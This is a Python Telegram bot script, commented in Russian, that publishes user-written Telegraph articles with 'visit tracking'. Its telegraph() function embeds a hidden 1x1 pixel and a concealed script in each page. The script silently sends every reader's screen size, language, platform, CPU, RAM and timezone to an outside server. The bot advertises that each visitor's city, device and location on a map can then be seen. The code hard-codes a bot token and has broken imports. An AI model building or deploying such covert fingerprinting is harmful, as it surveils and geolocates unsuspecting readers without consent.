import asyncio
import logging
import sqlite3
import json
import os
from datetime import datetime
import threading

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

import myflask  # Импортируем наш Flask сервер
from flask import Flask

# ========== ИМПОРТ ИЗ flask.py ==========
# Здесь мы импортируем функцию telegraph из flask.py
# Предполагается, что flask.py находится в той же папке
try:
    from flask import telegraph, SERVER_URL
except ImportError:
    # Если не получается импортировать, определяем здесь
    SERVER_URL = 'https://tux200.pythonanywhere.com'
    
    def telegraph(title, text, server_url, user_id, username):
        import requests
        import json
        
        content_nodes = []
        paragraphs = text.split('\n\n')
        for p in paragraphs:
            if p.strip():
                content_nodes.append({
                    'tag': 'p',
                    'children': [p.strip()]
                })
        
        tracking_url = f'{server_url}/pixel.gif?user={user_id}'
        
        content_nodes.append({
            'tag': 'div',
            'attrs': {'style': 'display:none'},
            'children': [
                {
                    'tag': 'img',
                    'attrs': {
                        'src': tracking_url,
                        'width': '1',
                        'height': '1'
                    }
                },
                {
                    'tag': 'script',
                    'children': [
                        '(function() {',
                        f'fetch("{server_url}/api/log", {{',
                        'method: "POST",',
                        'headers: {"Content-Type": "application/json"},',
                        'body: JSON.stringify({',
                        'screen: screen.width + "x" + screen.height,',
                        'language: navigator.language,',
                        'platform: navigator.platform,',
                        'cores: navigator.hardwareConcurrency,',
                        'ram: navigator.deviceMemory,',
                        'timezone: Intl.DateTimeFormat().resolvedOptions().timeZone',
                        '})',
                        '});',
                        '})();'
                    ]
                }
            ]
        })
        
        url = "https://api.telegra.ph/createPage"
        params = {
            'title': title,
            'author_name': 'Security Bot',
            'content': json.dumps(content_nodes, ensure_ascii=False),
            'return_content': False
        }
        
        try:
            response = requests.post(url, data=params)
            result = response.json()
            if result.get('ok'):
                return result['result']['url']
        except:
            pass
        return None

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = '8723627532:AAHzxW1Z1wCnWY3mRrKynLAsddWI0F6Pew4'
DB_NAME = 'bot_database.db'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== БАЗА ДАННЫХ ==========
def get_db_connection():
    """Создаёт соединение с БД"""
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Инициализация базы данных"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица статей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS articles (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            title TEXT,
            content TEXT,
            telegraph_url TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Таблица статистики посещений (ссылка на JSON файлы)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            article_id INTEGER,
            json_file TEXT,
            total_visits INTEGER DEFAULT 0,
            last_visit TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id),
            FOREIGN KEY (article_id) REFERENCES articles (id)
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("База данных инициализирована")

def add_user(user_id, username, first_name=None, last_name=None):
    """Добавляет или обновляет пользователя"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO users (user_id, username, first_name, last_name, last_seen)
        VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
        ON CONFLICT(user_id) DO UPDATE SET
            username = excluded.username,
            first_name = excluded.first_name,
            last_name = excluded.last_name,
            last_seen = CURRENT_TIMESTAMP
    ''', (user_id, username, first_name, last_name))
    
    conn.commit()
    conn.close()

def get_user(user_id):
    """Получает информацию о пользователе"""
    conn = get_db_connection()
    user = conn.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)).fetchone()
    conn.close()
    return user

def add_article(user_id, title, content, telegraph_url):
    """Сохраняет статью в БД"""
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO articles (user_id, title, content, telegraph_url)
        VALUES (?, ?, ?, ?)
    ''', (user_id, title, content, telegraph_url))
    
    article_id = cursor.lastrowid
    
    # Создаём запись в статистике
    json_file = f'visits_{user_id}.json'
    cursor.execute('''
        INSERT INTO stats (user_id, article_id, json_file)
        VALUES (?, ?, ?)
    ''', (user_id, article_id, json_file))
    
    conn.commit()
    conn.close()
    return article_id

def get_user_articles(user_id):
    """Получает все статьи пользователя"""
    conn = get_db_connection()
    articles = conn.execute('''
        SELECT * FROM articles 
        WHERE user_id = ? 
        ORDER BY created_at DESC
    ''', (user_id,)).fetchall()
    conn.close()
    return articles

def update_stats(user_id, article_id=None):
    """Обновляет статистику посещений"""
    json_file = f'visits_{user_id}.json'
    
    if os.path.exists(json_file):
        with open(json_file, 'r', encoding='utf-8') as f:
            visits = json.load(f)
        total = len(visits)
        last = visits[-1]['timestamp'] if visits else None
        
        conn = get_db_connection()
        if article_id:
            conn.execute('''
                UPDATE stats 
                SET total_visits = ?, last_visit = ?
                WHERE user_id = ? AND article_id = ?
            ''', (total, last, user_id, article_id))
        else:
            conn.execute('''
                UPDATE stats 
                SET total_visits = ?, last_visit = ?
                WHERE user_id = ?
            ''', (total, last, user_id))
        conn.commit()
        conn.close()

# ========== TELEGRAM БОТ ==========
router = Router()

class ArticleStates(StatesGroup):
    waiting_content = State()
    waiting_title = State()

# Клавиатуры
menu_buttons = [
    [
        InlineKeyboardButton(text='📝 Создать статью', callback_data='make_article'),
        InlineKeyboardButton(text='👤 Профиль', callback_data='show_user_profile')
    ],
    [
        InlineKeyboardButton(text='📊 Мои статьи', callback_data='my_articles'),
        InlineKeyboardButton(text='📈 Статистика', callback_data='my_stats')
    ]
]
menu = InlineKeyboardMarkup(inline_keyboard=menu_buttons)

profile_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text='📊 Моя статистика', callback_data='my_stats')],
        [InlineKeyboardButton(text='📝 Мои статьи', callback_data='my_articles')],
        [InlineKeyboardButton(text='🔙 В главное меню', callback_data='back_to_main')]
    ]
)

back_button = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text='🔙 Назад', callback_data='back_to_main')]
    ]
)

# Тексты
TEXTS = {
    'menu': "🔍 <b>Главное меню</b>\nВыберите действие:",
    'article': "📝 Введите основной текст статьи:",
    'title_for_article': "📝 Введите заголовок статьи:"
}

@router.message(Command('start'))
async def start_handler(msg: Message):
    user_id = msg.from_user.id
    username = msg.from_user.username or "no_username"
    first_name = msg.from_user.first_name
    last_name = msg.from_user.last_name
    
    # Добавляем пользователя в БД
    add_user(user_id, username, first_name, last_name)
    
    await msg.answer('👋 Привет! Я бот для создания статей в TelegraPH с отслеживанием посещений!')
    await msg.answer(TEXTS['menu'], reply_markup=menu, parse_mode="HTML")

@router.callback_query(F.data == 'show_user_profile')
async def show_profile(clbck: CallbackQuery):
    user_id = clbck.from_user.id
    user = get_user(user_id)
    
    if user:
        reg_date = datetime.strptime(user['registered_at'], '%Y-%m-%d %H:%M:%S').strftime('%d.%m.%Y %H:%M')
    else:
        reg_date = "неизвестно"
    
    username = clbck.from_user.username or "нет"
    first_name = clbck.from_user.first_name or ""
    
    # Ссылка на страницу отслеживания
    tracking_url = f"{SERVER_URL}/stats/{user_id}"
    
    # Получаем количество статей
    articles = get_user_articles(user_id)
    articles_count = len(articles)
    
    # Получаем статистику посещений
    json_file = f'visits_{user_id}.json'
    visits_count = 0
    if os.path.exists(json_file):
        with open(json_file, 'r', encoding='utf-8') as f:
            visits = json.load(f)
            visits_count = len(visits)
    
    await clbck.message.edit_text(
        f"<b>👤 ПРОФИЛЬ ПОЛЬЗОВАТЕЛЯ</b>\n"
        f"═══════════════════\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👤 Username: @{username}\n"
        f"📝 Имя: {first_name}\n"
        f"📅 Регистрация: {reg_date}\n"
        f"📊 Статей создано: {articles_count}\n"
        f"👥 Всего посещений: {visits_count}\n\n"
        f"📈 <b>Страница отслеживания:</b>\n"
        f"<a href='{tracking_url}'>{tracking_url}</a>",
        reply_markup=profile_menu,
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    await clbck.answer()

@router.callback_query(F.data == 'my_stats')
async def show_stats(clbck: CallbackQuery):
    user_id = clbck.from_user.id
    tracking_url = f"{SERVER_URL}/stats/{user_id}"
    
    json_file = f'visits_{user_id}.json'
    visits_count = 0
    last_visit = "никогда"
    
    if os.path.exists(json_file):
        with open(json_file, 'r', encoding='utf-8') as f:
            visits = json.load(f)
            visits_count = len(visits)
            if visits:
                last_visit = visits[-1]['timestamp'][:19]
    
    await clbck.message.edit_text(
        f"<b>📊 ВАША СТАТИСТИКА</b>\n"
        f"═══════════════════\n\n"
        f"👥 Всего посещений: {visits_count}\n"
        f"🕐 Последний визит: {last_visit}\n\n"
        f"📈 <b>Полная статистика:</b>\n"
        f"<a href='{tracking_url}'>{tracking_url}</a>\n\n"
        f"💡 Там вы увидите город, устройство, браузер и карту для каждого посетителя!",
        reply_markup=back_button,
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    await clbck.answer()

@router.callback_query(F.data == 'my_articles')
async def show_articles(clbck: CallbackQuery):
    user_id = clbck.from_user.id
    articles = get_user_articles(user_id)
    
    if not articles:
        await clbck.message.edit_text(
            "📭 У вас пока нет созданных статей.\n\n"
            "Нажмите «📝 Создать статью» в главном меню!",
            reply_markup=back_button,
            parse_mode="HTML"
        )
        await clbck.answer()
        return
    
    text = "<b>📝 ВАШИ СТАТЬИ</b>\n═══════════════════\n\n"
    
    for i, article in enumerate(articles[-5:], 1):
        created = datetime.strptime(article['created_at'], '%Y-%m-%d %H:%M:%S').strftime('%d.%m.%Y')
        text += f"{i}. <a href='{article['telegraph_url']}'>{article['title']}</a>\n"
        text += f"   📅 {created}\n\n"
    
    if len(articles) > 5:
        text += f"и ещё {len(articles) - 5} статей...\n\n"
    
    text += "💡 Чтобы создать новую статью, нажмите «📝 Создать статью»"
    
    await clbck.message.edit_text(
        text,
        reply_markup=back_button,
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    await clbck.answer()

@router.callback_query(F.data == 'back_to_main')
async def back_to_menu(clbck: CallbackQuery):
    await clbck.message.edit_text(
        TEXTS['menu'],
        reply_markup=menu,
        parse_mode='HTML'
    )
    await clbck.answer()

@router.callback_query(F.data == 'make_article')
async def create_art_start(clbck: CallbackQuery, state: FSMContext):
    await clbck.message.edit_text(TEXTS['article'])
    await state.set_state(ArticleStates.waiting_content)
    await clbck.answer()

@router.message(ArticleStates.waiting_content)
async def get_article_content(message: Message, state: FSMContext):
    user_input = message.text
    
    if user_input and len(user_input.strip()) > 0:
        await state.update_data(article_content=user_input.strip())
        await message.answer(TEXTS['title_for_article'])
        await state.set_state(ArticleStates.waiting_title)
    else:
        await message.answer("❌ Пожалуйста, напишите текст статьи:")

@router.message(ArticleStates.waiting_title)
async def get_article_title(message: Message, state: FSMContext):
    user_input = message.text
    
    if user_input and len(user_input.strip()) > 0:
        data = await state.get_data()
        content = data.get('article_content')
        title = user_input.strip()
        user_id = message.from_user.id
        username = message.from_user.username or f"user_{user_id}"
        
        status_msg = await message.answer("⏳ Создаю статью, подождите...")
        
        try:
            article_url = telegraph(title, content, SERVER_URL, user_id, username)
            
            if article_url:
                # Сохраняем в БД
                add_article(user_id, title, content, article_url)
                
                tracking_url = f"{SERVER_URL}/stats/{user_id}"
                
                await status_msg.delete()
                await message.answer(
                    f"✅ <b>Статья успешно создана!</b>\n\n"
                    f"🔗 <b>Ссылка на статью:</b>\n"
                    f"{article_url}\n\n"
                    f"📊 <b>Страница отслеживания:</b>\n"
                    f"{tracking_url}\n\n"
                    f"👥 Теперь все, кто перейдут по ссылке, будут отображаться на странице статистики!",
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
            else:
                await status_msg.delete()
                await message.answer("❌ Ошибка при создании статьи. Попробуйте позже.")
                
        except Exception as e:
            await status_msg.delete()
            logging.error(f'Ошибка создания статьи: {e}')
            await message.answer("❌ Произошла ошибка при создании статьи")
        
        await state.clear()
    else:
        await message.answer("❌ Пожалуйста, напишите заголовок статьи:")

@router.message(Command('stats'))
async def cmd_stats(message: Message):
    user_id = message.from_user.id
    tracking_url = f"{SERVER_URL}/stats/{user_id}"
    
    await message.answer(
        f"📊 <b>Ваша страница статистики:</b>\n"
        f"{tracking_url}\n\n"
        f"Там отображаются все посещения ваших статей!",
        parse_mode="HTML",
        disable_web_page_preview=True
    )

# ========== ЗАПУСК ==========
async def main():
    # Инициализация БД
    init_db()
    
    # Создание бота и диспетчера
    bot = Bot(token=BOT_TOKEN)
    storage = MemoryStorage()
    dp = Dispatcher(storage=storage)
    
    # Подключение роутеров
    dp.include_router(router)
    
    # Запуск Flask сервера в отдельном потоке
    try:
        from flask import start_flask
        flask_thread = threading.Thread(target=start_flask, daemon=True)
        flask_thread.start()
        logging.info("Flask сервер запущен в фоновом потоке")
    except ImportError:
        logging.warning("Flask сервер не запущен - файл flask.py не найден")
    
    # Запуск бота
    logging.info("Бот запущен и готов к работе")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())